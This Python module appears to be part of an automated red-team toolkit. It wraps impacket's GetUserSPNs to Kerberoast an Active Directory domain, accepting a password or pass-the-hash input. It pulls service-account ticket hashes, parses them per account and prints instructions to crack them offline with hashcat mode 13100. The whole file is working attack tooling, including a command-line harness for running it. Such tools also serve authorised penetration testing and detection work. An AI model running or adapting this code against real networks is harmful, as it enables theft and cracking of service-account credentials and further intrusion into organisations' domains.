import re
import subprocess
import time

TOOL_BINARY = "impacket-GetUserSPNs"   # apt install: impacket-GetUserSPNs
                                        # pip install: GetUserSPNs.py


TECHNIQUE_ID   = "T1558.003"
TECHNIQUE_NAME = "Kerberoasting"


def run_kerberoast(domain, username, password=None, dc_ip=None, hashes=None, timeout=120):
    
    start = time.monotonic()

    # impacket format: "domain/user:pass" for plaintext, "domain/user" with -hashes for PtH
    target = f"{domain}/{username}"
    if password and not hashes:
        target += f":{password}"

    cmd = [TOOL_BINARY, target, "-request"]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]
    if hashes:
        cmd += ["-hashes", hashes]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,         # nonzero exit code is data, not an exception
        )
    except subprocess.TimeoutExpired as e:
        return _error(
            f"timed out after {timeout}s — DC unreachable or cred lockout loop?",
            stderr=e.stderr or "",
            duration=time.monotonic() - start,
        )
    except FileNotFoundError:
        return _error(
            f"{TOOL_BINARY!r} not found on PATH. "
            "Install: apt install python3-impacket  OR  pip install impacket",
            duration=time.monotonic() - start,
        )

    try:
        parsed = _parse(result.stdout, result.stderr, result.returncode)

        if parsed["auth_failed"]:
            return _error(
                "authentication failed — check username/password or hashes",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )

        return {
            "technique_id": TECHNIQUE_ID,
            "technique_name": TECHNIQUE_NAME,
            "tool": "kerberoast",
            "status": "success",
            "summary": _summary(parsed),
            "data": parsed,
            "error": None,
            "raw_stderr_tail": None,
            "duration_seconds": round(time.monotonic() - start, 2),
        }
    except Exception as e:
        return _error(
            f"unexpected parse error: {e}",
            stderr=result.stderr,
            duration=time.monotonic() - start,
        )


# ─── Internal helpers ─────────────────────────────────────────────────────────

def _parse(stdout, stderr, returncode):
    
    spn_accounts = []
    hashes = []

    in_table = False
    saw_dashes = False
    for line in stdout.splitlines():
        stripped = line.strip()

        # Detect start of SPN table
        if "ServicePrincipalName" in stripped:
            in_table = True
            continue

        # Dash separator line after header
        if in_table and not saw_dashes and all(c in "-| " for c in stripped) and stripped:
            saw_dashes = True
            continue

        # Hash lines (appear after blank line following the table)
        if stripped.startswith("$krb5tgs$"):
            # Embedded account name: $krb5tgs$23$*<account>$DOMAIN$spn*$hash
            m = re.match(r"\$krb5tgs\$\d+\$\*([^$]+)\$", stripped)
            account = m.group(1) if m else "unknown"
            hashes.append({
                "account": account,
                "hash": stripped,
                "hashcat_mode": 13100,
            })
            in_table = False
            continue

        # Table data rows
        if in_table and saw_dashes and stripped and not stripped.startswith("$"):
            parts = stripped.split()
            if len(parts) >= 2:
                spn_accounts.append({"spn": parts[0], "username": parts[1]})
            elif len(parts) == 1 and "/" in parts[0]:
                spn_accounts.append({"spn": parts[0], "username": "unknown"})

    # Auth failure signals buried in stderr
    auth_failed = any(
        sig in (stderr or "").lower()
        for sig in [
            "status_logon_failure",
            "wrong password",
            "invalid credentials",
            "kdc_err_preauth_failed",
        ]
    )

    return {
        "spn_account_count": len(spn_accounts),
        "spn_accounts": spn_accounts,
        "hash_count": len(hashes),
        "hashes": hashes,
        "auth_failed": auth_failed,
        "exit_code": returncode,
    }


def _summary(p):
    if p["hash_count"] == 0:
        return (
            f"Kerberoasting: {p['spn_account_count']} SPN account(s) found "
            f"but no tickets obtained — accounts may require special rights or have AES-only encryption."
        )
    names = [h["account"] for h in p["hashes"]]
    return (
        f"Kerberoasted {p['hash_count']} account(s): {', '.join(names)}. "
        f"Run hashcat with mode 13100 to crack offline."
    )


def _error(reason, stdout="", stderr="", duration=None):
    return {
        "technique_id": TECHNIQUE_ID,
        "technique_name": TECHNIQUE_NAME,
        "tool": "kerberoast",
        "status": "timeout" if "timed out" in reason else "error",
        "summary": f"Kerberoasting failed: {reason}",
        "data": None,
        "error": reason,
        "raw_stderr_tail": (stderr or "")[-500:] or None,
        "duration_seconds": round(duration, 2) if duration is not None else None,
    }


# ─── Terminal smoke-test ───────────────────────────────────────────────────────
# Usage: python3 kerberoast.py lab.local user 10.0.0.5 -p Password123
# Usage: python3 kerberoast.py lab.local user 10.0.0.5 --hashes ':NT_HASH'

if __name__ == "__main__":
    import argparse, json

    ap = argparse.ArgumentParser(
        description="Kerberoast wrapper — manual test harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 kerberoast.py lab.local svc_user 10.0.0.5 -p Password123
  python3 kerberoast.py lab.local svc_user 10.0.0.5 --hashes ':aad3b435b51404ee...'
  python3 kerberoast.py lab.local baduser 10.0.0.5 -p WRONG   # test auth failure
        """,
    )
    ap.add_argument("domain",   help="Target domain, e.g. lab.local")
    ap.add_argument("username", help="Valid domain username")
    ap.add_argument("dc_ip",    help="Domain controller IP")
    ap.add_argument("-p", "--password", default=None, help="Plaintext password")
    ap.add_argument("--hashes",  default=None, help="LMhash:NThash for PtH")
    ap.add_argument("--timeout", type=int, default=120)
    args = ap.parse_args()

    result = run_kerberoast(
        domain=args.domain,
        username=args.username,
        password=args.password,
        dc_ip=args.dc_ip,
        hashes=args.hashes,
        timeout=args.timeout,
    )
    print(json.dumps(result, indent=2))